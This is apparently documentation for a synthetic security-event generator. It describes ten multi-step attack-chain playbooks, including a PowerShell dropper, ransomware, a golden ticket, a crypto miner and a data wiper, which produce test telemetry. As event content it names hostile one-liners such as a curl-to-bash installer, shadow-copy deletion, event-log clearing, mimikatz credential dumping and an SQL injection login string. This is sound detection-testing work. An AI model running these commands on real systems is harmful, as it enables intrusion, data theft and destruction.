# Attack Chain Playbooks

Correlated chains generated by `scripts/attack_chains/generator.py` (picked via `PLAYBOOKS` and controlled by `ATTACK_CHAIN_RATIO`). Each playbook yields multiple ECS-like events sharing user/asset/IP context and an `attack.id`.

> Note: Chains can now terminate early when a step is blocked/failed; the last event may carry `chain_stop_reason: blocked_mid_chain`.

## powershell_dropper_chain
- Step 1 `initial_access`: `malicious_powershell_detect` severity 3, action blocked. Outlook launches `powershell.exe` (parent `outlook.exe`) with encoded `-enc` payload, performs DNS A lookup to a random domain, HTTP GET to CDN-like URL, drops `C:\Windows\Temp\svch0st.exe` with SHA256, and adds HKCU Run key `OneDriveUpdater`.
- Step 2 `recon`: `retrohunt` severity 2, action logged. Runs `whoami /all` from the same host/user/IP context.
- Step 3 `exfiltration`: `sigflow_alert` severity 3, outcome success/failure. Packages `C:\Users\Public\report.zip` with SHA256 and attempts HTTPS PUT to random domain; network direction set to outbound.

## ssh_lateral_chain
- Step 1 `credential_access`: `malcore` severity 3, action blocked. Inbound to port 22 with failed network logon (`bad_password`/`expired_password`).
- Step 2 `lateral_movement`: `retrohunt` severity 2, action allowed. Successful SSH command `ssh -o StrictHostKeyChecking=no user@<dst_ip>` from the same src/dst/user/asset.
- Step 3 `collection`: `sigflow_alert` severity 3, action logged. Creates `/tmp/ssl_backup.tgz` with SHA256 and marks network direction internal (staging for exfil).

## ransomware_encryption_chain
- Step 1 `initial_access`: `malicious_powershell_detect` severity 3, action blocked. `winword.exe` spawns `wscript.exe` executing `C:\Users\Public\invoice.js`; file metadata and SHA256 recorded.
- Step 2 `defense_evasion`: `shellcode_detect` severity 4. Executes `vssadmin delete shadows /all /quiet` to remove shadow copies; outcome success/failure varies.
- Step 3 `impact`: `sigflow_alert` severity 4. Runs `encryptor.exe --threads 8 --paths C:\Users`, writes ransom note `readme_for_decryption.txt` with SHA256, network direction internal.

## sql_injection_exfil_chain
- Step 1 `initial_access`: `malcore` severity 2, action blocked. Inbound HTTPS POST to `login.php?user=admin'--` on port 443, response status randomized.
- Step 2 `collection`: `retrohunt` severity 3, action allowed. Executes `mysqldump ... customers > /tmp/customer_dump.sql`; captures file size and SHA256.
- Step 3 `exfiltration`: `sigflow_alert` severity 3, action blocked, outcome success/failure. HTTPS POST to CDN-like URL sending `/tmp/customer_dump.sql.gz`; sets network direction outbound and records compressed file metadata.

## rdp_persistence_chain
- Step 1 `credential_access`: `malcore` severity 2, action allowed. Successful inbound RDP network logon on port 3389; logon metadata noted.
- Step 2 `persistence`: `retrohunt` severity 2, action logged. Creates scheduled task `OneDrive Updater` running `C:\Windows\Temp\svc.exe` every 30 minutes.
- Step 3 `lateral_movement`: `sigflow_alert` severity 3, action logged. Runs `mstsc.exe /v:fileserver01.fusionai.local`; network direction internal to show pivoting.

## vpn_phishing_chain
- Step 1 `initial_access`: `malcore` severity 2, inbound allowed VPN logon to port 443. `logon` metadata marks success, MFA method, and foreign GEO source.
- Step 2 `execution`: `malicious_powershell_detect` severity 3, action logged. Hidden PowerShell process with encoded `-enc` payload performs DNS lookup to CDN-like domain.
- Step 3 `exfiltration`: `sigflow_alert` severity 3, action blocked. HTTPS POST to randomly generated domain uploads `vpn_creds.csv`; file metadata and SHA256 recorded; direction outbound.

## kerberos_golden_ticket_chain
- Step 1 `credential_access`: `shellcode_detect` severity 4, action blocked. `mimikatz.exe` invocation dumps `krbtgt` secrets, capturing dump file metadata.
- Step 2 `privilege_escalation`: `retrohunt` severity 3, action logged. `klist tgt` validates forged tickets, logon metadata notes Kerberos success.
- Step 3 `lateral_movement`: `sigflow_alert` severity 4, action allowed. `wmic` remote process creation against a server; network direction internal to show pivot.

## linux_crypto_miner_chain
- Step 1 `initial_access`: `malcore` severity 3, inbound HTTP to high port. `curl -fsSL http://<domain>/install.sh | bash` recorded along with direction inbound.
- Step 2 `execution`: `retrohunt` severity 3, action logged. Bash installer drops `/tmp/xmrig` (size + SHA256).
- Step 3 `impact`: `sigflow_alert` severity 3, action blocked. `xmrig` connects outbound to mining pool on port 3333/4444/5555; direction outbound and process command captured.

## cloud_cli_abuse_chain
- Step 1 `initial_access`: `malcore` severity 2, allowed. AWS CLI `configure` usage with stolen keys is recorded in `process`.
- Step 2 `discovery`: `retrohunt` severity 3, action logged. `aws ec2 describe-instances` plus HTTPS POST to `ec2.amazonaws.com`; direction outbound.
- Step 3 `collection`: `sigflow_alert` severity 3, action blocked. `aws s3 sync /tmp/exports s3://...` uploads ledger file (metadata + SHA256) to autogenerated bucket URL.

## smb_data_wiper_chain
- Step 1 `initial_access`: `malcore` severity 3, internal allowed SMB (dest port 445). `psexec.exe` runs remote `cmd.exe` against shared host.
- Step 2 `defense_evasion`: `shellcode_detect` severity 3, action logged. `wevtutil cl Security/System` clears Windows event logs.
- Step 3 `impact`: `sigflow_alert` severity 4, action blocked. `cipher.exe /w:C:\Finance` removes backup files, capturing wildcard path metadata; direction internal.
